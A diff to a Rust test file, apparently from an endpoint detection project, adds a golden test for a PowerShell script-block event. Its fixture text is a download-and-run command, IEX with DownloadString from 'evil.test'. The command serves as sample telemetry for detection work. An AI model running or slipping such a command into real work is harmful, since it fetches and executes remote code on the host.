@@ -8,7 +8,7 @@ use std::net::IpAddr;
 use schema::detection::{Detection, DetectionSource, ScoreAttribution, Severity};
 use schema::{
     ConnectEvent, DnsQueryEvent, Event, EventMeta, ExecEvent, FileOpenEvent, ImageLoadEvent,
-    RegistrySetEvent, User,
+    RegistrySetEvent, ScriptBlockEvent, User,
 };
 
 fn fixture(name: &str) -> serde_json::Value {
@@ -209,6 +209,31 @@ fn dns_query_golden() {
 }
 
 #[test]
+fn script_block_golden() {
+    assert_golden(
+        &Event::ScriptBlock(ScriptBlockEvent {
+            meta: EventMeta {
+                pid: 5120,
+                ppid: 620,
+                user: User::Windows {
+                    sid: "S-1-5-21-1004336348-1177238915-682003330-512".into(),
+                    integrity_level: Some(0x3000),
+                },
+                timestamp_ns: 1_756_900_040_000_000_000,
+                comm: "powershell.exe".into(),
+            },
+            script_block_id: "a1b2c3d4-e5f6-7890-abcd-ef1234567890".into(),
+            path: None,
+            text: "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/payload.ps1')"
+                .into(),
+            message_number: 1,
+            message_total: 1,
+        }),
+        "script_block",
+    );
+}
+
+#[test]
 fn image_load_golden() {
     assert_golden(
         &Event::ImageLoad(ImageLoadEvent {
@@ -366,6 +391,14 @@ fn meta_accessor_covers_all_variants() {
         Event::ImageLoad(ImageLoadEvent {
             meta: meta.clone(),
             image_path: String::new(),
+        }),
+        Event::ScriptBlock(ScriptBlockEvent {
+            meta: meta.clone(),
+            script_block_id: String::new(),
+            path: None,
+            text: String::new(),
+            message_number: 1,
+            message_total: 1,
         }),
     ];
     for e in &events {
